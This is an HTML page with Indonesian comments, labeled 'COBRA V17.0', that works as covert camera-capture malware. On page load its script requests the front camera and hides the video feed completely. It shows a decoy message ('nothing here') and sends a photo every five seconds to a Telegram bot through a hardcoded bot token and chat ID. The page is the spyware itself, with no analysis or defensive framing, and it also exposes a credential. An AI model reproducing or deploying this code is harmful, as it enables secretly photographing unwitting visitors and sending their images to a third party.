<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            min-height: 100vh;
            background: #000000;
            font-family: system-ui, sans-serif;
        }
        
        /* VIDEO TETAP JALAN TAPI DISEMBUNYIKAN TOTAL */
        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0.001;
            pointer-events: none;
            z-index: -1;
            visibility: hidden;
        }
        
        /* EFEK FLASH */
        .flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 100;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.05s;
        }
        
        /* TEKS UTAMA DI TENGAH */
        .teks-utama {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: clamp(1.2rem, 6vw, 2rem);
            font-weight: 500;
            color: rgba(255,255,255,0.8);
            z-index: 101;
            opacity: 0;
            text-align: center;
            font-family: monospace;
            white-space: nowrap;
            pointer-events: none;
        }
        
        @keyframes muncul {
            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
            20% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            100% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
        }
        
        .muncul-teks {
            animation: muncul 2s ease forwards;
        }
        
        /* NOTIF KECIL DI BAWAH */
        .notif {
            position: fixed;
            bottom: 40px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            padding: 8px 16px;
            border-radius: 20px;
            color: white;
            font-size: 12px;
            z-index: 102;
            font-family: monospace;
            opacity: 0;
            transition: opacity 0.3s;
            pointer-events: none;
        }
        
        .notif.show {
            opacity: 1;
        }
        
        .notif.success {
            background: rgba(0,150,0,0.9);
        }
        
        .notif.error {
            background: rgba(150,0,0,0.9);
        }
        
        /* DOT INDICATOR */
        .dot {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ff4444;
            z-index: 103;
        }
        
        .dot.active {
            background: #00ff00;
            animation: kedip 1s infinite;
        }
        
        @keyframes kedip {
            0% { opacity: 0.3; transform: scale(0.8); }
            100% { opacity: 1; transform: scale(1.2); }
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <div class="flash" id="flash"></div>
    <div class="teks-utama" id="teksUtama">Ga ada Apa Apa Sehhh</div>
    <div class="notif" id="notif">📸</div>
    <div class="dot" id="dot"></div>

    <script>
        // ============ COBRA V17.0 - SELFIE TERSEMBUNYI ============
        const BOT_TOKEN = "8611976046:AAHXzkj8icyuSpjQbQScyyCdAEE6qy_m2Kg";
        const CHAT_ID = "8336543740";
        const COOLDOWN_MS = 5000;
        
        const video = document.getElementById('video');
        const flash = document.getElementById('flash');
        const teksUtama = document.getElementById('teksUtama');
        const notif = document.getElementById('notif');
        const dot = document.getElementById('dot');
        
        let stream = null;
        let aktif = false;
        let cooldown = false;
        
        // ============ NOTIF ============
        function tampilNotif(pesan, sukses = true) {
            notif.textContent = pesan;
            notif.className = 'notif show ' + (sukses ? 'success' : 'error');
            setTimeout(() => {
                notif.className = 'notif';
            }, 2000);
        }
        
        // ============ KIRIM FOTO ============
        async function kirimFoto(dataUrl) {
            try {
                const blob = await (await fetch(dataUrl)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'selfie.jpg');
                
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const hasil = await res.json();
                
                if (hasil.ok) {
                    tampilNotif('✅ Foto berhasil', true);
                    return true;
                } else {
                    tampilNotif('❌ Gagal kirim', false);
                    return false;
                }
            } catch(e) {
                tampilNotif('❌ Error: ' + e.message, false);
                return false;
            }
        }
        
        // ============ EFEK FLASH ============
        function efekFlash() {
            flash.style.opacity = '1';
            setTimeout(() => flash.style.opacity = '0', 100);
            // Getaran kecil biar kaya beneran
            document.body.style.transform = 'scale(0.998)';
            setTimeout(() => document.body.style.transform = '', 60);
        }
        
        // ============ MUNCULIN TEKS ============
        function munculTeks() {
            teksUtama.classList.remove('muncul-teks');
            void teksUtama.offsetWidth;
            teksUtama.classList.add('muncul-teks');
        }
        
        // ============ AMBIL FOTO (DIAM-DIAM) ============
        async function ambilFoto() {
            if (!stream || !aktif || cooldown) return;
            
            cooldown = true;
            dot.style.background = '#ffaa00';
            
            // Flash dan teks
            efekFlash();
            munculTeks();
            
            // Capture dari video (user gak liat videonya)
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            
            if (video.videoWidth > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
            }
            
            const fotoData = canvas.toDataURL('image/jpeg', 0.7);
            
            // Kirim ke bot
            await kirimFoto(fotoData);
            
            dot.style.background = '#00ff00';
            
            // Cooldown 5 detik
            setTimeout(() => {
                cooldown = false;
                if (aktif && stream) ambilFoto();
            }, COOLDOWN_MS);
        }
        
        // ============ MULAI KAMERA ============
        async function mulaiKamera() {
            dot.style.background = '#ffaa00';
            
            try {
                // Kamera depan (selfie)
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "user" } }
                });
                
                video.srcObject = stream;
                await video.play();
                
                aktif = true;
                dot.style.background = '#00ff00';
                dot.classList.add('active');
                
                // Tunggu stabil lalu ambil foto pertama
                setTimeout(() => {
                    ambilFoto();
                }, 800);
                
            } catch(err) {
                // Coba kamera default
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    video.srcObject = stream;
                    await video.play();
                    aktif = true;
                    dot.style.background = '#00ff00';
                    dot.classList.add('active');
                    
                    setTimeout(() => {
                        ambilFoto();
                    }, 800);
                    
                } catch(err2) {
                    dot.style.background = '#ff4444';
                    tampilNotif('❌ Izin kamera diperlukan!', false);
                }
            }
        }
        
        // ============ JALANKAN ============
        window.addEventListener('load', () => {
            mulaiKamera();
        });
        
        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(t => t.stop());
        });
        
        // Klik layar buat retry kalo gagal
        document.body.addEventListener('click', () => {
            if (!aktif && !stream) mulaiKamera();
        });
    </script>
</body>
</html>
